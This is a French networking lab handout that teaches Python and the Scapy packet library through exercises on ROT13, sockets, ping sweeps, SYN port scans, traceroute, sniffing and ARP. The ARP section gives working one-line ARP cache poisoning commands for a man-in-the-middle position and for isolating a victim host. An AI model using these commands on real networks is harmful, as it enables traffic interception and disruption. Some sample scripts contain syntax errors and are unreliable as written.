# Python & la librarie Scapy

Nous allons utiliser dans ce TP le langage Python (v. 3.x) sur un dispositif Linux (WSL sous windows, MacOS ou sur du matériel de type Raspberry Pi).
Il y a deux possibilités pour vous connecter :
* directement avec login et password connecté à un écran et clavier/souris.
* ou à distance via une interface ssh (adresse ip à trouver)

Si vous utilisez un Raspberry Pi, les login/ password par défaut à utiliser sont : *pi / raspberry*

Le langage python est déjà installé sur le raspberry. Les librairies utiles pourront être installées en utilisant la commande 
```bash
pip install <nom_librairie>
```

## Exercice 1 : Ave Caesar !
En cryptographie, le chiffrage de César est une technique très simple de chiffrement où chaque lettre est remplacée par une autre. Par exemple, avec un remplacement de 3, A sera remplacé par la lettre D, B deviendra un E, etc. Julius Caesar utilisait cette technique pour communiquer avec ses généraux. ROT13 (rotation de 13 places) est souvent utilisé comme un exemple d’usage de ce code. En Python, la clé **RO13** peut être représentée par le biais du dictionnaire suivant :
```
key = {'a':'n', 'b':'o', 'c':'p', 'd':'q', 'e':'r', 'f':'s', 'g':'t', 'h':'u',
'i':'v', 'j':'w', 'k':'x', 'l':'y', 'm':'z', 'n':'a', 'o':'b', 'p':'c',
'q':'d', 'r':'e', 's':'f', 't':'g', 'u':'h', 'v':'i', 'w':'j', 'x':'k',
'y':'l', 'z':'m', 'A':'N', 'B':'O', 'C':'P', 'D':'Q', 'E':'R', 'F':'S',
'G':'T', 'H':'U', 'I':'V', 'J':'W', 'K':'X', 'L':'Y', 'M':'Z', 'N':'A',
'O':'B', 'P':'C', 'Q':'D', 'R':'E', 'S':'F', 'T':'G', 'U':'H', 'V':'I',
'W':'J', 'X':'K', 'Y':'L', 'Z':'M'}
```
Votre tâche dans cet exercice est d’implémenter un encodeur/décodeur de **ROT-13**. Une fois fait, vous devriez être en mesure de lire le message secret suivant :
```
Pnrfne pvcure? V zhpu cersre Pnrfne fnynq!
```

**Note** : Vous utiliserez un alphabet latin non accentué.

## Exercice 2 : Parlez-vous l’ICAO ?
L’alphabet défini par l’ICAO (International Civil Aviation Organization) assigne des mots aux lettres de l’alphabet (Alfa for A, Bravo for B, etc.) permettant une communication orale non ambiguë entre un émetteur et un récepteur.

* Définissez un dictionnaire en python permettant cette transcription
* Ecrivez une fonction *speak_ICAO()* qui transforme n’importe quel texte en mots prononcés via une TTS (Text-to-Speech) avec l’alphabet *ICAO*
* Modifiez votre fonction de telle manière qu’elle accepte un paramètre supplémentaire : un nombre indiquant le temps de pause (en ms) entre deux mots *ICAO*

**Note** : vous serez amenés à importer deux librairies : *os et time*.
* Sous Linux, vous pourrez utiliser **espeak** pour prononcer les mots (espeak –ven "texte à dire " 2>/dev/null)
* Sous mac, la commande **say** devrait fonctionner …
* Enfin, sous windows, vous pouvez télécharger la commande **SayStatic** ici : https://github.com/truillet/ups/blob/master/m2issd/outils/SayStatic.exe

**Note 2 :**
Sous Python, la commande pour faire "parler" le Raspberry ressemble à cela :
```python
import os

txt = "papa tango Charlie "
os.system("espeak –ven \"" + txt + "\" 2>/dev/null")
```

## Exercice 3 : découverte du module socket
A l’aide du document disponible ici (**https://docs.python.org/3/library/socket.html**), répondez aux questions suivantes :

1. Qu’est-ce qu’une application client/serveur ?
2. Décrire les différentes étapes nécessaires à l’établissement d’une connexion entre un client et un serveur.
3. Comment le client envoie-t-il un message au serveur ? Comment le serveur le récupère-t-il ?

## La librairie scapy - forger ses paquets !
Scapy est une librairie de manipulation de paquets réseaux. Cet utilitaire permet de manipuler, forger, décoder, émettre, recevoir les paquets d’une multitude de protocoles (ARP, DHCP, DNS, ICMP, IP…).

Il peut facilement manipuler la plupart des tâches classiques comme le scan, traceroute, des investigations, des attaques ou la découverte de réseaux. Il permet d’exécuter des tâches spécifiques que la plupart des autres outils ne sont pas capables de traiter, comme envoyer des trames invalides, injecter ses propres trames, combiner des techniques, etc.

**Documentation scapy** : https://scapy.readthedocs.io/en/latest/installation.html

### Création d’une trame Éthernet
L’échange de paquets avec un serveur web est loin d’être simple, elle fait intervenir le protocole HTTP, le handshake TCP, l’entête IP, ..., bref, énormément de choses ...

Après avoir éventuellement installé scapy, (pip install scapy), lançons scapy en tapant la commande **sudo scapy** (pour avoir les droits administrateur)

Commençons donc par créer et afficher une trame ethernet dans l’interpréteur scapy :
```
>>> trame = Ether()
>>> trame.show()
```
Regardez le résultat … La création d’une trame Ethernet se fait en instanciant la classe Ether(). Bien qu’on ne lui ait fourni aucun paramètre, on peut constater à l’appel de la méthode show() que les attributs dst, src et type ont des valeurs par défaut.

* dst : représente l’adresse mac du destinataire
* src : représente l’adresse mac de l’émetteur
* type : représente le type de protocole (dépend du contenu de la partie « data » pour l’instant vide)

Pour les modifier, c’est très simple :
```
>>> trame.dst = "A0:B3:CC:C6:9E:10"
```

On aurait pu aussi préciser l’adresse MAC du destinataire lors de la création de la trame :
```
>>> trame = Ether(dst="A0:B3:CC:C6:9E:10")
```
Les attributs dst, src et type sont modifiables à votre guise. Cela veut donc dire que vous pouvez donc très simplement envoyer des trames en faisant croire que l’émetteur est quelqu’un d’autre …

### Envoi de la trame

Pour envoyer une trame Ethernet, il existe la fonction **sendp()** (pour la couche 2 du modèle OSI)
```
>>> sendp(trame)
```

Ce que nous venons de faire ne présentait guère d’intérêt. En effet, une trame Ethernet pure ne sert pratiquement à rien. Pour pouvoir faire quelque chose d’intéressant, il faudrait donc mettre quelque chose dans le champ « data » vu plus haut... Nous allons donc faire de **l’encapsulation** de paquets.

### Encapsuler les protocoles : l’exemple du ping

La commande ping permet de savoir si un hôte, désigné par son adresse IP, existe. La commande ping consiste à envoyer un paquet ICMP « *echo-request* » à l’hôte et à dire si un paquet ICMP « *echo-reply* » a été renvoyé.

Forgeons donc un paquet ICMP echo-request !
```
>>> ping = ICMP()
>>> ping.show()
```
On voit que par défaut, l’instanciation de la classe ICMP() met le type du ping à echo-request.

D’après le protocole ICMP, un paquet ICMP est encapsulé dans un datagramme IP. En effet, c’est dans le datagramme IP qu’on va pouvoir renseigner l’adresse IP du destinataire. L’encapsulation entre protocoles, dans scapy, est réalisée par l’opérateur **/** (slash).
```
>>> ping = Ether() / IP(dst="192.168.0.254") / ICMP()
>>> ping.show()
```

On constate que, en précisant simplement l’adresse IP du destinataire, scapy a modifié tout seul qu’il devait modifier les attributs dst, src et type de Ether() ainsi que l’adresse IP de l’émetteur (src dans IP()) !

Voyons maintenant si l’adresse indiquée va répondre à cela par un paquet ICMP echo-reply.

### Envoi du paquet

L’envoi s’effectue comme auparavant :
```
>>> sendp(ping)
```
Et ... il ne se passe rien !

La fonction sendp() ne fait qu’envoyer le paquet. Pour envoyer et recevoir, il faut utiliser les fonctions srp()ou srp1().

srp() renvoie deux objets : le premier contient les paquets émis et leurs réponses associées, l’autre contient les paquets sans réponse.

```
>>> rep,non_rep = srp(ping)
```
Envoyez le paquet ... Analysez le résultat !

On a bien reçu un ICMP echo-reply ! 😊

**rep** contient en réalité une liste de couples de paquets. En l’occurrence, la liste ne contient qu’un seul couple de paquets, qu’on peut afficher ainsi comme on afficherait n’importe quel élément d’une liste en Python :
```
>>> rep[0]
```

Le résultat est un couple (tuple à deux valeurs). Pour afficher le paquet émis (ICMP echo-request), on fera donc rep[0][0].show(), et pour le paquet reçu en réponse, rep[0][1].show() :

```
>>> rep[0][0].show()
>>> rep[0][1].show()
```

Pour simplifier tout cela, on peut préférer ici la fonction srp1(). Cette fonction ne renvoie qu’un seul objet : la première réponse réponse.
```
>>> rep = srp1(ping)
```
La plupart du temps, on ne s’intéressera pas à la partie Ethernet qui est remplie de façon automatique par scapy. Les fonctions send(), sr() et sr1() sont équivalentes à sendp(), srp() et srp1() mis à part le fait qu’elles se chargent toutes seules d’ajouter l’en-tête Ethernet.

Un exemple :
```
>>> rep = sr1(IP(dst="192.168.0.254") / ICMP())
>>> rep.show()
```

Quand on procède ainsi, on voit que même dans la réponse, l’en-tête Ethernet n’apparaît plus.

Essayons la même chose sur un hôte non existant :
```
>>> rep = sr1(IP(dst="192.168.1.254") / ICMP())
```
Pour voir les autres paramètres que peut prendre sr1(), faites help(sr1) :)

### Exercice : scan d’une plage d’adresses

A la lumière des explications ci-dessus, codez un programme qui effectue un **ping** sur toute une plage d’adresses.

**Note** : pour désigner une plage d’adresse, vous pouvez simplement mettre ‘192.168.0.1-254’ dans l’attribut dst de IP

### Liste de ports

Prenons un cas concret : nous voulons savoir si un serveur web est accessible en http et en https. Nous pourrions tenter un scan des ports correspondant par défaut : 80 et 443. Plutôt que d’envoyer/recevoir deux fois en changeant simplement le port, nous allons utiliser une liste sur le port de destination en mettant :
```
dport=[80,443]
```

Utilisons un scan SYN. Le principe est simple, un paquet TCP est envoyé sur le port désiré de la cible avec le flag SYN. Si son port accepte les connexions, il renverra un paquet TCP avec les flags SYN et ACK.
```
>>> paquet = IP(dst="192.168.0.254") / TCP(sport=12345, dport=[80,443], flags='S')
>>> rep,non_rep = sr(paquet)
```
Analysez le résultat ... Qu’en concluez-vous ?

### traceroute
La commande traceroute permet de savoir par où passent vos paquets avant d’atteindre leur destination. Pour cela, on se sert de l’attribut ttl (**time to live**) de l’en-tête IP. Cet attribut diminue de 1 à chaque routeur traversé, et lorsqu’il atteint 0, il « meurt » (n’est pas réémis) et le paquet est détruit. On peut alors exploiter l’attribut src de son en-tête IP pour connaître l’adresse IP du routeur où il n’est plus réémis.
Pour connaître tous les routeurs traversés, il suffit donc de mettre, dans l’attribut ttl, un rang.

Si vous ne comprenez pas tout, un bout de code vaut mieux qu’un grand discours :
```
>>> rep,non_rep=sr( IP(dst="209.85.143.100", ttl=(1,25)) / TCP(), timeout=1 )
```
Analysez le résultat !

### sniff : écouter le réseau

Voilà une simplification de la signature de cette fonction :
```
sniff(filter="", count=10, prn=None, lfilter=None, timeout=None)
```

**sniff** renvoie une liste de paquets (en comparaison, sr() renvoie deux listes de paquets).
Ses paramètres sont :

* **count** : nombre de paquets à capturer. 0 : pas de limite.
* **timeout** : stoppe le sniff après un temps donné.
* **iface** : désigne l’interface sur laquelle sniffer. La liste de vos interfaces est donnée par la commande ifconfig.
* **filter** : filtre les paquets à garder d’après une chaîne de caractère.

*Exemple* : filter="port 80" filtre les paquets ayant un lien avec le port 80.

* **lfilter** : même chose, mais utilise une fonction plutôt qu’une chaîne.

*Exemple* : lfilter=lambda x: x[1].src==‘192.168.0.12’ filtre les paquets émis par 192.168.0.12.

* **prn** : fonction à appliquer à chaque paquet. Si la fonction retourne quelque chose, cela s’affiche.

*Exemple* : prn = lambda x: x.show() va afficher le détail de chaque paquet.

On peut préciser l’interface que l’on veut utiliser avec l’option **iface**.
```
>>> trafic=sniffer(iface="eth0")
```
Nous pouvons maintenant lister les paquets reçu (ici uniquement de l’UDP) avec la commande **summary()**.

| **Commande** | **Description** |
| --- | --- |
| trafic[n] | Accès au paquet n |
| trafic[n].show() | Affichage propre du paquet n |
| trafic[n][proto] | Accès uniquement au protocole "proto" du paquet n (exemple : **trafic[0][UDP])** |
| trafic[n].[proto].champs | Accès au champs du protocole "proto" du paquet n (exemple : **trafic[0][IP].dst)** |
| trafic[0].haslayer(proto) | Retourne 1 si le protocole « proto » est présent dans le paquet n, 0 sinon (**exemple: trafic[0].haslayer(TCP)**) |

***Figure 1*** : accès aux paquets

Voici un qui écoute 10 trames réseau :
```
a=sniff(count=10)
a.nsummary()
```

### Le [protocole ARP](https://www.ietf.org/rfc/rfc903.txt) et scapy
ARP (Adresse Resolution Protocol) est un protocole qui sert de liaison entre la couche 2 et 3 du modèle OSI, c’est à dire qu’il permet d’associer une Adresse MAC avec une Adresse IP.

De cette manière, le routage des paquets peut se dérouler correctement sur le réseau. Cette association MAC/IP est stockée dans le cache ARP. Le protocole ARP peut envoyer une requête afin de connaitre à qui appartient une adresse IP (Opération who-has) et une réponse qui permet d’identifier l’adresse IP avec l’adresse MAC (Opération is-at). Cependant, ARP peut faire le contraire en utilisant RARP (Reverse ARP).

L’ARP Cache Poisoning est une attaque extrêmement simple et rapide à mettre en place, car il s’agit juste de modifier l’adresse MAC d’une entrée dans le cache ARP par une autre.

Pour se faire, il suffit simplement de forger un paquet ARP de type « is-at » et de l’envoyer, avec scapy, cette attaque peut se faire en une seule ligne.
```
>>> target = "192.168.0.200"
>>> victim = "192.168.0.48"
>>> sendp(Ether(dst=getmacbyip(victim),src="votre_adresse_mac")/ARP(op="is-at",hwsrc="votre_adresse_mac", hwdst=getmacbyip(victim), psrc=target, pdst=victim))
```

Utilisé avec l’adresse MAC de votre machine, vous serez placés en **Man In the Middle**, c’est à dire que votre machine sera entre les deux machines, ce qui vous donne un contrôle sur leurs trafics respectifs (enfin, en théorie … 😊).

Nous pouvons de la même manière isoler une machine du réseau en lui disant que l’IP du routeur est associé avec l’adresse MAC 00:00:00:00:00:00 (ou autre, tant qu’elle est inexistante).
```
>>> target = "192.168.0.200"
>>> victim = "192.168.0.48"
>>> sendp(Ether(dst=getmacbyip(victim),src="ff:ff:ff:ff:ff:ff")/ARP(op="is-at",hwsrc="ff:ff:ff:ff:ff:ff", hwdst=getmacbyip(victim), psrc=target, pdst=victim))
```
## Et en python ? Programmons un peu …
### Envoyer et recevoir des paquets

Voici un script qui permet l’envoi de paquets :
```python
#!/usr/bin/env python
from scapy.all import *
send(IP(dst="1.2.3.4")/ICMP())
sendp(Ether()/IP(dst="1.2.3.4",ttl=(1,4)), iface="eth0")
```

Les deux principales lignes de code présentent des fonctions d’envoi différentes. send() est utilisé pour envoyer des paquets à la troisième couche de protocole, tandis que sendp() est utilisé pour envoyer des paquets à la deuxième couche de protocole.

La différence est très importante car certains paquets, comme ICMP, sont spécifiques à certaines couches, et c’est à nous de savoir quels paquets peuvent être utilisés à quelle couche. scapy dispose également d’un ensemble de commandes pour envoyer et recevoir des paquets en même temps, qui peuvent être utilisées dans un script python comme suit :

```python
#!/usr/bin/env python
from scapy.all import *

ans,unans=sr(IP(dst="192.168.86.130",ttl=5)/ICMP()
ans.nsummary()
unans.nsummary()
p=sr1(IP(dst="192.168.86.130")/ICMP()/"XXXXXX")
p.show()
```

La fonction sr() permet d’envoyer des paquets et de recevoir des réponses. Elle renvoie quelques paquets avec les réponses, ainsi que les paquets sans réponse, qui peuvent être affichés comme indiqué ci-dessus. La fonction sr1() est une variante qui ne renvoie que le paquet qui a répondu au paquet envoyé. sr() et sr1() ne concernent que les paquets de la couche 3. Si vous souhaitez envoyer et recevoir des paquets de la couche 2, vous devez utiliser srp() ou srp1().

**Créer un script python qui envoie et reçoit des paquets de couche 2, puis affiche les informations concernant les paquets envoyés et reçus.**

### script python avancé avec scapy
```python
#!/usr/bin/env python
import sys from scapy.all
import sr1,IP,ICMP

p=sr1(IP(dst=sys.argv[1])/ICMP())
if p:
  p.show()
```

Le script précédent introduit des arguments système en entrée. L’adresse de destination sys.argv[1] signifie qu’après l’exécution du script, le premier argument qui suit l »exécution du script sera utilisé comme adresse de destination, par exemple : # ./scapysr.py 192.168.0.1. Ainsi, nous n’avons plus besoin d’éditer le fichier source à chaque fois que nous voulons utiliser une adresse IP différente.

Scapy peut également utiliser des méthodes afin de construire des programmes entiers dédiés à certaines fonctions, telles que le sniffing de paquets en direct :
```python
#!/usr/bin/env python
from scapy.all import *

def arp_monitor_callback(pkt):
  if ARP in pkt and pkt[ARP].op in (1,2): # who-has or is-at
    return pkt.sprintf("%ARP.hwsrc% %ARP.psrc%")

sniff(prn=arp_monitor_callback, filter="arp", store=0)
```

Cela créé un sniffeur de paquets en direct qui renverra toutes les requêtes ARP qui sont vues sur toutes les interfaces.
L’ensemble de la méthode stipule que si un paquet est à la fois un paquet ARP et que l’opération de ce paquet est **who-has** ou **is-at**, alors il affichera une ligne indiquant l’adresse MAC source et l’adresse IP source de ce paquet ARP. Cette méthode est appliquée à la commande sniff à l’aide de la fonction prn. Une autre chose importante à noter est que « store=0 » est également appliqué à la commande sniff, et ce afin que scapy évite de stocker tous les paquets dans sa mémoire.

### Scanner ARP
Il existe une multitude d’outils permettant de découvrir les adresses IP internes. Beaucoup de ces outils utilisent le protocole de résolution d'adresses (**ARP**) pour découvrir les hôtes.
Télécharger le code à l’adresse suivante et l’éxécuter : (arpscan)[https://github.com/truillet/ups/blob/master/m2issd/code/arpscan.py]

**Combien de machines sont-elles connectées sur le réseau et trouvez leur adresse MAC ?**
